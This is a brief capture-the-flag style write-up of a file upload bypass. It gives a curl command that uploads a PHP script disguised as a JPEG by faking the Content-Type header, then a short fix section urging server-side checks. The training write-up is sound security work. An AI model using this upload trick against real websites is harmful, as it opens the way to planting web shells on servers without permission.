# File upload type exploit

## Exploit
On the image upload page `${URL}?page=upload` we can supposedly upload an image file, let's try uploading a php script and faking the `Content-type` header instead:
```shell
echo '<?php echo "hello world"?>' | curl -s -X POST -F "Upload=Upload" -F "uploaded=@-;filename=42.php;type=image/jpeg" "${URL}?page=upload" | grep flag
```

## Fix
Never trust user input, the file verification should be done server-side instead of only with `content-type`. There is no easy and perfect fix here.
